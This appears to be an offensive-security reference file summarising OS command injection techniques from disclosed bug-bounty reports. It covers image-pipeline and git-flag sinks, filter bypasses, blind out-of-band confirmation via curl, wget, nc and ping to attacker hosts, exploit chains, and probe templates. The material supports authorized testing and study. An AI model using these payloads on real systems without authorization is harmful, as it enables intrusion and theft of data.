# OS Command Injection — reference layer

> **Lookup, not reading.** Open a section when its trigger fires; don't read this end to end.
> The method lives in `../command-injection.md` — that one you read every time.
>
> Grounded in disclosed reports — see the corpus note at the end. `[#id]` = hackerone.com/reports/id.

| § | trigger |
|---|---|
| **C1** | which real binary/interpreter got invoked, and by what feature |
| **C2** | the filter/escaper that failed, and the character that got through |
| **C3** | argument/flag injection — no metacharacter at all |
| **C4** | blind execution — what proved it fired |
| **C5** | confirming safely — the ceiling these reporters actually used |
| **C6** | chains: a lesser bug becomes command execution |
| **C7** | corroboration, dedup, and the corpus's limits |
| **C8** | worked examples |

---

## C1. The real sink

- **Image/PostScript pipelines.** ImageMagick/GraphicsMagick handing a `%!PS`-prefixed upload to
  Ghostscript is the corpus's most repeated sink: a bulk product-image upload's
  `/OutputFile (%pipe%python -c '...')` device property spawned a reverse shell [#422944]; an
  identical `%pipe%bash -c '...'` against a report-logo upload [#403417]; and a `.gif`-renamed EPS
  profile-image upload hitting Ghostscript CVE-2017-8291 [#365271]. The sink is the image library's
  own PS-interpreter handoff, not app code.
- **`gm convert` argument injection.** An image crop endpoint's `y` parameter reached GraphicsMagick
  with every shell metacharacter escaped **except the space** — enough to append a whole extra
  argument, `-write |ps aux|curl ...`, GraphicsMagick's documented pipe-filename feature [#212696].
- **Archive extraction.** Nextcloud's Extract app builds
  `exec("unrar x \"".$file."\" -R \"".$dir."\" -o+"...)` — an unescaped `"` in the filename closes
  the quote [#546753].
- **Git operations.** GitLab's Search API (`ref`) and Commits API (`ref_name`) concatenate an
  attacker value onto a `git log`/`rev-list` command line unsanitized [#658013, #653125]; a separate
  archive-size check builds `"gzip -dc #{@archive_path} | wc -c"` via `Open3.popen3` [#1609965].
- **Markup rendering.** GitLab's WikiCloth mediawiki renderer exposes a Lua extension; a
  `loadstring`+`setfenv` sandbox escape reaches Lua's own `io.popen(command)` from a wiki page
  [#1401444].
- **Admin consoles.** Jenkins `/script` Groovy (`"cmd".execute().text`), both authenticated
  [#2083771] and unauthenticated on a separate host [#1125329].
- **Worker/scheduled jobs.** An Airflow example DAG interpolates Jinja2 `{{params.source_location}}`
  into a `BashOperator` `bash_command` — sink is a queued task, not the web request [#1671140].
- **A hand-rolled "network tool" form.** WebPageTest's `testlog.php` built a shell command from its
  `filter` querystring, found by reading the tool's own open-source PHP [#73567].

## C2. Filters and escapers that failed

- **Space survives `escapeshellcmd`-style escaping** — every metacharacter quoted except the one
  character argument injection actually needs [#212696]; `${IFS}` substituted for literal spaces
  where a separate filter *did* block them [#212696].
- **Plain double-quote breakout, no encoding needed** — `sample.rar"|curl ...|"` against a filename
  wrapped in `"..."` [#546753].
- **A unicode-escaped quote passes a literal-character filter**: Confluence's OGNL/Velocity injection
  sent the four-character sequence backslash-u-0-0-2-7 (the JSON/JS unicode escape for an apostrophe)
  in place of a literal quote to close a string the app apparently filtered only for the literal
  character, then chained `+{Class.forName(...)}+` [#1327769, #1327701].
- **Null byte truncates the extension check, not the shell** — `poc.asp\x00.png` landed on disk as a
  live `.asp` webshell wrapping `WScript.Shell.exec("cmd /c " & cmd)` [#2054184]; the injection
  technique is the upload-filter bypass, the shell itself uses ordinary concatenation once live.
- **A pipe-prefixed "filename" is a cross-language gadget, not unique to GraphicsMagick** — Ruby's
  `IO.read('|command')` runs `command` through a shell exactly like `gm`'s `-write |command`, reached
  here via a Redis-backed Sidekiq deserialization gadget (`class_eval` + `IO.read`) [#1672388].

## C3. Argument injection — no metacharacter at all

- GitLab's `--output=/tmp/file` on `ref`/`ref_name` needs zero special characters beyond the leading
  dashes: it writes the last commit's log (itself attacker-set via a controlled commit message) to an
  arbitrary path, chained to overwriting `/var/opt/gitlab/.ssh/authorized_keys` for direct SSH access
  [#658013]. The sibling report on the Commits API only reaches file **truncation** under a race — a
  second triggered command fails and empties the file rather than completing a write, so the
  demonstrated impact is DoS/corruption, not a clean overwrite [#653125].
- **Drupalgeddon2 is Form-API array-key injection, not string concatenation.** The payload sets
  `name[#post_render][]=passthru` and `name[#markup]=id`: Drupal's render pipeline calls
  `#post_render` callables with `#markup` as the argument, so naming the callback `passthru` turns an
  ordinary AJAX form array into an arbitrary-PHP-function call with fully attacker-controlled shell
  text as its argument [#1063256]. No shell metacharacter appears anywhere in the payload.

## C4. Blind execution — what proved it fired

- **Command substitution + timing, then OOB via a client already on the box** — one report's first
  payload, `$(`sleep 20`)` in a form field, was confirmed purely by a ~20s response delta against
  baseline; its second payload, `wget sandbox.../$(id)`, turned the command's own output into a URL
  path segment in the attacker's access log [#73567]. A Redis-gadget RCE attempt used the same idea
  piping `hostname; ps aux` to `nc`/`curl` [#1672388].
- **Side-effect file creation as the sole oracle** — Lua's `io.popen` proof paired a rendered `id`
  with `execute('echo vakzz > /tmp/ggg')` [#1401444]; a Rails `MessageVerifier`/Marshal ERB gadget
  proof used only `` `touch /tmp/rce` ``, the file's existence (then removal) being the entire
  evidence for a sink with no output channel at all [#473888].
- **ICMP as the callback channel**, not DNS/HTTP: SharePoint CVE-2019-0604's deserialization PoC ran
  `cmd.exe /c ping <attacker-host>`, confirmed via `tcpdump -e icmp[icmptype]==8` [#534630] — worth
  remembering when egress blocks DNS/HTTP but not ICMP.
- **The worker's own error log is sometimes the oracle** — GitLab's `Open3.popen3` shell-string
  injection was proven entirely from Sidekiq's logged `tar` error text plus the resulting file's
  contents, no external listener needed [#1609965]; an Airflow DAG injection surfaced the same way,
  in the task's own log plus a marker file [#1671140].
- **Reflected output is the strongest confirmation when the sink allows it** — Confluence's OGNL
  chain rendered `cat /etc/passwd` straight back into a hidden form field [#1327769, #1327701];
  Drupalgeddon2 likewise returned command output directly in the HTTP response [#1063256].

## C5. Confirming safely — the ceiling these reporters used

Every proof against a live target used one non-destructive signal: `id`, `whoami`, `hostname`, `ls`,
one `sleep`, one file touch/echo, or one outbound `curl`/`wget`/`nc`/`ping` — never destructive, and
reporters routinely stopped short of an interactive shell once execution was proven (one Pulse
Secure reporter stopped before even attempting the documented post-auth injection — C6) [#671749].
Full reverse shells do appear [#422944, #403417, #546753], but only against a program-offered
demo/sandbox instance, never production. Treat that as the exception, not the model.

## C6. Chains: a lesser bug becomes command execution

- **File-read/credential-theft → post-auth command injection — asserted, not shown.** Two Pulse
  Secure reports chain CVE-2019-11510's pre-auth file read (session/credential `.mdb` files) into
  authenticated access, then invoke CVE-2019-11539 post-auth command injection for full RCE — but
  neither report's text contains the injection payload itself, only a reference to the researchers'
  own external conference slides [#591295, #678496].
- **Path traversal → SSH-key overwrite → shell**, via two unrelated bug classes converging on the
  same file: a Maven package-registry PUT with `%2e%2e%2f` traversal wrote directly into
  `authorized_keys` [#733072] — the identical file the git-flag `--output=` technique also reached
  [#658013].
- **Upload-filter bypass → webshell → classic concatenation injection**: the null-byte extension
  bypass in C2 drops a live ASP page whose own `cmd` querystring is naive `cmd /c &` concatenation
  [#2054184].
- **Deserialization → `ProcessBuilder`/`Process.Start` → OS command.** SharePoint CVE-2019-0604's
  XAML `ObjectDataProvider` gadget targets `System.Diagnostics.Process`, `MethodName="Start"`, with
  literal `cmd.exe /c <command>` parameters [#534630]. Liferay CVE-2020-7961's c3p0
  `WrapperConnectionPoolDataSource` gadget ends in a Nashorn `ScriptEngine.eval()` that builds a
  `ProcessBuilder`, branches on `os.name`, and runs `bash -c`/`cmd.exe /c` with an attacker header
  value [#2742457]. Rails `ActiveSupport::MessageVerifier`/`MessageEncryptor` default to `Marshal`; an
  allocated-not-initialized `ERB` object with `@src` set to a backtick string, dumped and later
  `.result`-ed, makes `Kernel#eval` the sink [#473888]. **Counter-example**: a DotNetNuke
  cookie-deserialization report demonstrates only a `FileSystemUtils.WriteFile` gadget — file write,
  not command execution — despite the report's title and impact section both claiming RCE [#876708].
- **XSS/click-driven → native URI handler → OS execution, zero shell metacharacters.** Two
  Rocket.Chat Electron-client reports pass an attacker string to `shell.openExternal()`: prior XSS
  driving a `file://` launch of Calculator [#899964], and an ordinary chat message linking `smb://`
  to a Samba share hosting a `.desktop` launcher whose `Exec=` line runs an arbitrary command —
  clicking it hands execution to the desktop environment's own launcher [#924151]. The "injection" is
  an unfiltered URI scheme, not a character.
- **Config-file write → delayed execution via a JVM error handler.** A headless-Chrome
  remote-debugging exposure (via XSS + clickjacking, unrelated to command injection itself) wrote
  `user.vmoptions` setting `-XX:OnOutOfMemoryError=open -a Calculator`; the JVM, not the app, runs
  that string as a shell command the next time the process exhausts heap [#1274695]. Ask "what runs
  my written config file" beyond the obvious cron/webhook cases.

## C7. Corroboration, dedup, and the corpus's limits

- **The ImageMagick/Ghostscript `%pipe%` trick is not a one-off** — identical against three unrelated
  programs [#422944, #403417, #365271]. Any image upload still running an unpatched Ghostscript is
  worth the five-minute PoC.
- **GitLab's git-flag injection recurs across unrelated sinks** (Search API `ref` [#658013], Commits
  API `ref_name` [#653125], archive-size shell string [#1609965]) — each a distinct `fix_locus`.
  Enumerate every ref/path/filename reaching a `git`/shell call separately.
- **Two Confluence reports are the same CVE against two endpoints** — `doenterpagevariables.action`
  vs `createpage-entervariables.action`, identical payload [#1327769, #1327701] — evidence for
  testing every integration endpoint separately, not a novelty claim for either alone. Two
  independent Jenkins `/script` findings make the same point about admin consoles — near-certain
  duplication on a mature program [#2083771, #1125329].
- **Novelty here lives in renderers that shell out** (WikiCloth's Lua `io.popen` [#1401444] — worth
  testing template/markup pipelines as command sinks, not only for SSTI) and in
  **worker/scheduled-job parameters** the crawler never sees (Airflow's DAG-trigger body [#1671140]).

## C8. Worked examples

**A. PostScript-in-image-upload, reflective.** *Model:* an upload field (logo/avatar/product image)
with no magic-byte check, image library unpinned. *Probe:* a file beginning `%!PS` with
`/OutputFile (%pipe%<interpreter> -c '<benign>')`. *Confirm:* one outbound connection to a listener.
*fix_locus =* "ImageMagick/GraphicsMagick policy.xml permits PS/EPS coders" [#422944, #403417,
#365271].

**B. Flag injection via a ref/path parameter into `git`.** *Model:* any API field documented as a
"ref", "branch", or "path" concatenated onto a `git` command line. *Probe:* a value starting
`--output=/tmp/<marker>` alone, nothing else. *Confirm:* the marker file exists (chain to a readable
location, or straight to `authorized_keys`). *fix_locus =* the specific `git`-invoking call site, not
"the git flag bug" generically [#658013, #653125].

---

## Grounded in disclosed reports

*Corpus: 31 reports fetched, all stored under `knowledge/reports/deserialization/` — cached there by
a shared upstream fetch even though every ID here is command injection, not deserialization (three
cited above chain *through* a deserialization gadget on their way to a `ProcessBuilder`/
`Process.Start`/backtick call, and are cited in C6 for that reason). `[#id]` = hackerone.com/reports/id.*

**24 of the 31 supplied a concrete, independently-checkable technique** and are cited above. 5 more
narrate a real chain but stop short of showing the injection itself: two Pulse Secure reports
document the file-read/credential-theft half of a documented CVE chain and reference the post-auth
command-injection CVE by number without reproducing it [#591295, #678496]; a third Pulse Secure
report says outright the reporter stopped before attempting the post-auth stage [#671749]; a DNN
cookie-deserialization report demonstrates only a file-write gadget despite claiming RCE [#876708];
and the Burp Suite report is a real, working chain but its final sink is a JVM error-handler flag
rather than application code [#1274695] — included in C6 as a genuine, if unusual, technique. One
report (#260005) is a links-only citation of three public SCM CVEs with no independent PoC of its
own. One report (#1418891, Apache Flink's `jars/{id}/plan`) was excluded outright: real and detailed,
but its sink is Java class loading, not command-line construction — a different bug class carrying
the same "RCE" label.
